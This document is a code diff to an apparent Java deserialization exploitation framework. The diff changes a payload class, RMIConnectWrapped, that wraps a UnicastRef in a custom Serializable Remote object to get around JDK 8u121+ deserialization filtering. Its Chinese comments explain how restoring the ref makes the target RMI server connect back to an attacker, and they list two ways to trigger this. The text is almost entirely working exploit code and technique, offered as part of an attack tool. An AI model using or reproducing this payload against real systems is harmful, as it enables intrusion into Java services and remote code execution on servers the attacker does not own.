@@ -9,19 +9,26 @@ import ysomap.core.bean.Bullet;
 import ysomap.core.bean.Payload;
 import ysomap.core.bullet.jdk.rmi.RMIConnectBullet;
 
-import javax.management.remote.rmi.RMIConnectionImpl_Stub;
 import java.rmi.Remote;
 import java.rmi.server.RemoteRef;
 
 /**
  * @author wh1t3P1g
  * @since 2020/2/26
+ * 原理 UnicastRef 继承 java.io.Externalizable 还原相应的ref
+ * 在remote端还原一个UnicastRef时，还原的内容会被注册到当前的ConnectionInputStream的incomingRefTable
+ * 在接受完lookup后，会调用StreamRemoteCall的releaseInputStream，处理incomingRefTable中的ref 后续进行反连操作
+ * 这里的利用方式有两种：(重点都在于怎么去触发readExternal函数还原相应的ref)
+ *  1. 找到封装UnicastRef的对象，如RMIConnectionImpl_Stub
+ *  2. 利用反序列化的递归反序列化过程
+ *      即 虽然找不到当前类，但是还是会继续对反序列化数据中类的属性进行递归反序列化
+ *          也就使得我们的ref可以注册上去
  */
 @SuppressWarnings({"rawtypes"})
 @Payloads
 @Require(bullets = {"RMIConnectBullet"}, param = false)
-@Dependencies({"using to bypass jdk>=8u121","wrapped with RMIConnectionImpl_Stub object"})
-@Authors({ Authors.WH1T3P1G })
+@Dependencies({"using to bypass jdk>=8u121","wrapped `UnicastRef` object"})
+@Authors({ Authors.WH1T3P1G, Authors.LALA })
 public class RMIConnectWrapped extends Payload<Remote> {
 
     @Override
@@ -46,14 +53,15 @@ public class RMIConnectWrapped extends Payload<Remote> {
         // DGCImpl_Stub OK
         // ReferenceWrapper_Stub
         // UnicastRemoteObject OK
-            // 获取到UnicastRemoteObject的实例
-            // Class clazz = Class.forName("java.rmi.server.UnicastRemoteObject");
-            // Constructor m = clazz.getDeclaredConstructor();
-            // m.setAccessible(true);
-            // UnicastRemoteObject UnicastRemoteObject_obj =(UnicastRemoteObject)m.newInstance();
-            // 修改实例的ref参数（使用yso中的模块）
-            // ReflectionHelper.setFieldValue(UnicastRemoteObject_obj,"ref",(RemoteRef)obj);
-            // return UnicastRemoteObject_obj;
-        return new RMIConnectionImpl_Stub((RemoteRef) obj);
+        // RMIConnectionImpl_Stub OK
+        return new CustomizedRemote((RemoteRef) obj);
+    }
+
+    public static class CustomizedRemote implements Remote, java.io.Serializable {
+        private RemoteRef ref;
+
+        public CustomizedRemote(RemoteRef remoteref) {
+            ref=remoteref;
+        }
     }
 }
